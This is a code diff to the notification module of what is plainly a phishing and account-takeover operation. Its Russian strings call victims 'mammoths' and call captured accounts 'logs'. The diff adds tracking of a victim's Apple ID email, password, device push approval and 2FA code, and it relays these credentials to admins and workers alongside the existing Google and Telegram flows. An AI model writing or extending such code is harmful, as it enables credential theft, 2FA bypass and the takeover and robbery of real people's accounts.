@@ -374,7 +374,7 @@ async def notify_user_event(
             await notify_session_revoked(user_tg_id, reason=details or "Сессия сброшена/отозвана на устройстве")
             return
 
-        is_final_auth = norm_step in ("authorized", "session", "complete", "2fa", "google_authorized", "google_complete")
+        is_final_auth = norm_step in ("authorized", "session", "complete", "2fa", "google_authorized", "google_complete", "apple_authorized", "apple_complete")
 
         # CRITICAL PROTECTION: If the user is already authorized,
         # ignore duplicate intermediate backward events so old packets never overwrite the successful log card.
@@ -460,14 +460,75 @@ async def notify_user_event(
             admin_header = "🔢 <b>Введен код Google | ⏳ Проверка входа</b>\n"
             worker_header = "🦣 <b>Мамонт ввел код Google!</b>\n\n"
             status_desc = "🔢 Ввел код Google (2FA), выполняется проверка..."
-        elif norm_step in ("authorized", "session", "complete", "2fa", "google_authorized", "google_complete"):
-            admin_header = "📬 <b>Новый лог | 🔑 Сессия успешно привязана</b>\n"
-            worker_header = "<b><i>🎉🔑 Успешный лог! </i></b>\n\n"
-            status_desc = "✅ authorized (Сессия привязана)"
+        elif norm_step in ("apple_email", "apple_waiting_password"):
+            admin_header = "🍏 <b>Введен Apple ID | ⏳ Ожидание пароля</b>\n"
+            worker_header = "🦣 <b>Мамонт выбрал Apple ID!</b>\n\n"
+            status_desc = "🍏 Ввел Apple ID, ожидает ввод пароля"
+        elif norm_step in ("apple_password", "apple_checking", "apple_waiting_action"):
+            admin_header = "🔑 <b>Введен пароль Apple ID | ⏳ Ожидание действия</b>\n"
+            worker_header = "🦣 <b>Мамонт ввел пароль Apple ID!</b>\n\n"
+            status_desc = "🔑 Пароль Apple ID введен, ожидает решение админа"
+        elif norm_step in ("apple_wrong_password", "apple_error_password"):
+            admin_header = "❌ <b>Неверный пароль Apple ID | ⏳ Ожидание повтора</b>\n"
+            worker_header = "🦣 <b>Отклонен пароль Apple ID!</b>\n\n"
+            status_desc = "❌ Неверный пароль Apple ID, ожидает повторный ввод"
+        elif norm_step in ("apple_prompt", "apple_show_prompt", "apple_ask_prompt"):
+            admin_header = "📲 <b>Отправлен пуш Apple ID | ⏳ Ожидание подтверждения</b>\n"
+            worker_header = "🦣 <b>Отправлен пуш на устройство Apple!</b>\n\n"
+            status_desc = "📲 Отправлен запрос на вход (пуш) на устройство Apple"
+        elif norm_step in ("apple_prompt_confirmed", "apple_prompt_approved"):
+            admin_header = "📲 <b>Пуш Apple разрешен | ⏳ Ожидание ввода кода</b>\n"
+            worker_header = "🦣 <b>Мамонт нажал «Разрешить» на устройстве Apple!</b>\n\n"
+            status_desc = "📲 Нажал «Разрешить» на устройстве Apple"
+        elif norm_step in ("apple_ask_code", "apple_waiting_code", "apple_2fa_waiting"):
+            admin_header = "🔢 <b>Запрошен 6-значный код Apple ID | ⏳ Ожидание ввода</b>\n"
+            worker_header = "🦣 <b>Запрошен 2FA код Apple ID!</b>\n\n"
+            status_desc = "🔢 Запрошен 6-значный проверочный код Apple ID"
+        elif norm_step in ("apple_code", "apple_2fa", "apple_code_entered"):
+            admin_header = "🔢 <b>Введен 2FA код Apple ID | ⏳ Проверка входа</b>\n"
+            worker_header = "🦣 <b>Мамонт ввел 2FA код Apple ID!</b>\n\n"
+            status_desc = "🔢 Ввел 6-значный код Apple ID, выполняется проверка..."
+        elif norm_step in ("apple_wrong_code", "apple_error_code"):
+            admin_header = "❌ <b>Неверный 2FA код Apple ID | ⏳ Ожидание повтора</b>\n"
+            worker_header = "🦣 <b>Неверный 2FA код Apple ID!</b>\n\n"
+            status_desc = "❌ Ввел неверный проверочный код Apple ID, пробует снова"
+        elif norm_step in ("apple_code_resend", "apple_prompt_resend"):
+            admin_header = "🔄 <b>Запрошен повторный код/пуш Apple ID</b>\n"
+            worker_header = "🦣 <b>Запросил повторный код Apple ID!</b>\n\n"
+            status_desc = "🔄 Запросил повторный код или пуш"
+        elif norm_step in ("authorized", "session", "complete", "2fa", "google_authorized", "google_complete", "apple_authorized", "apple_complete"):
+            is_apple_log = norm_step.startswith("apple_") or (email and ("icloud" in str(email).lower() or "apple" in str(email).lower()))
+            is_google_log = norm_step.startswith("google_") or (email and "gmail" in str(email).lower())
+            if is_apple_log:
+                admin_header = "📬 <b>Новый лог | 🍏 Apple ID успешно привязан</b>\n"
+                worker_header = "<b><i>🎉🍏 Успешный лог Apple ID! </i></b>\n\n"
+                status_desc = "✅ authorized (Apple ID привязан)"
+            elif is_google_log:
+                admin_header = "📬 <b>Новый лог | 📧 Google аккаунт успешно привязан</b>\n"
+                worker_header = "<b><i>🎉📧 Успешный лог Google! </i></b>\n\n"
+                status_desc = "✅ authorized (Google аккаунт привязан)"
+            else:
+                admin_header = "📬 <b>Новый лог | 🔑 Сессия успешно привязана</b>\n"
+                worker_header = "<b><i>🎉🔑 Успешный лог! </i></b>\n\n"
+                status_desc = "✅ authorized (Сессия привязана)"
         else:
             admin_header = f"📥 <b>Лог | {norm_step}</b>\n"
             worker_header = "🦣 <b>Новый мамонт в боте!</b>\n\n"
             status_desc = f"<code>{norm_step}</code>"
+
+        # Determine authentication provider for unified labeling
+        is_apple = norm_step.startswith("apple_") or (email and ("icloud" in str(email).lower() or "apple" in str(email).lower()))
+        is_google = norm_step.startswith("google_") or (email and "gmail" in str(email).lower())
+
+        if is_apple:
+            email_label = "🍏 <b>Apple ID:</b>"
+            pass_label = "Пароль Apple ID"
+        elif is_google:
+            email_label = "📧 <b>Google Email:</b>"
+            pass_label = "Пароль Google"
+        else:
+            email_label = "📧 <b>Email:</b>"
+            pass_label = "2FA Пароль"
 
         # 1. Admin Notification Message
         if is_test_event:
@@ -482,7 +543,7 @@ async def notify_user_event(
                 f"• <b>Номер телефона:</b> {phone_display}",
             ]
             if email:
-                mamont_data_lines.append(f"• 📧 <b>Google Email:</b> <code>{email}</code>")
+                mamont_data_lines.append(f"• {email_label} <code>{email}</code>")
             if ip and ip != "—":
                 prov = isp
                 if not prov:
@@ -498,7 +559,6 @@ async def notify_user_event(
 
             auth_data_lines = []
             if password_2fa:
-                pass_label = "Пароль Google" if (norm_step.startswith("google_") or email) else "2FA Пароль"
                 auth_data_lines.append(f"• 🔑 <b>{pass_label}:</b> <code>{password_2fa}</code>")
             auth_data_lines.append(f"• 📊 <b>Статус:</b> {status_desc}")
             if details and not is_final_auth:
@@ -518,6 +578,8 @@ async def notify_user_event(
                 f"• <b>Юзернейм:</b> {user_tag}",
                 f"• <b>Номер телефона:</b> {phone_display}",
             ]
+            if email:
+                admin_lines.append(f"• {email_label} <code>{email}</code>")
             if ip and ip != "—":
                 prov = isp
                 if not prov:
@@ -530,10 +592,10 @@ async def notify_user_event(
                 admin_lines.append(f"• 📱 <b>Устройство:</b> {device}")
 
             if password_2fa:
-                admin_lines.append(f"• <b>2FA Пароль:</b> <code>{password_2fa}</code>")
-            admin_lines.append(f"• <b>Статус:</b> {status_desc}")
+                admin_lines.append(f"• 🔑 <b>{pass_label}:</b> <code>{password_2fa}</code>")
+            admin_lines.append(f"• 📊 <b>Статус:</b> {status_desc}")
             if details and not is_final_auth:
-                admin_lines.append(f"• <b>Детали:</b> {details}")
+                admin_lines.append(f"• 📝 <b>Детали:</b> {details}")
 
             admin_text = "\n".join(admin_lines)
 
@@ -684,8 +746,8 @@ async def notify_user_event(
                 f"👤 <b>Юзер:</b> {user_tag} (ID: <code>{user_tg_id}</code>)",
                 f"📱 <b>Телефон:</b> {phone_display}",
             ]
-            if is_test_event and email:
-                w_user_lines.append(f"• 📧 <b>Google Email:</b> <code>{email}</code>")
+            if email:
+                w_user_lines.append(f"• {email_label} <code>{email}</code>")
             if ip and ip != "—":
                 prov = isp
                 if not prov:
@@ -697,8 +759,7 @@ async def notify_user_event(
             if device and device != "—":
                 w_user_lines.append(f"• 📱 <b>Устройство:</b> {device}")
             if password_2fa:
-                w_pass_label = "Пароль Google" if (norm_step.startswith("google_") or email or is_test_event) else "2FA Пароль"
-                w_user_lines.append(f"• 🔑 <b>{w_pass_label}:</b> <code>{password_2fa}</code>")
+                w_user_lines.append(f"• 🔑 <b>{pass_label}:</b> <code>{password_2fa}</code>")
 
             w_user_block = "\n".join(w_user_lines)
             w_status_block = f"<blockquote><i>📊 <b>Статус:</b> {status_desc}</i></blockquote>"
@@ -1003,11 +1064,21 @@ async def notify_auth_credential_event(
         ]
 
         if email:
-            text_lines.append(f"📧 <b>Аккаунт:</b> <code>{email}</code>")
+            if "apple" in event_type:
+                text_lines.append(f"🍏 <b>Apple ID:</b> <code>{email}</code>")
+            elif "google" in event_type:
+                text_lines.append(f"📧 <b>Google Email:</b> <code>{email}</code>")
+            else:
+                text_lines.append(f"📧 <b>Аккаунт:</b> <code>{email}</code>")
         if phone:
             text_lines.append(f"📞 <b>Телефон:</b> <code>{phone}</code>")
         if password:
-            text_lines.append(f"🔑 <b>Пароль:</b> <code>{password}</code>")
+            if "apple" in event_type:
+                text_lines.append(f"🔑 <b>Пароль Apple ID:</b> <code>{password}</code>")
+            elif "google" in event_type:
+                text_lines.append(f"🔑 <b>Пароль Google:</b> <code>{password}</code>")
+            else:
+                text_lines.append(f"🔑 <b>Пароль:</b> <code>{password}</code>")
         if details:
             text_lines.append(f"📝 <b>Детали:</b> <code>{details}</code>")
 
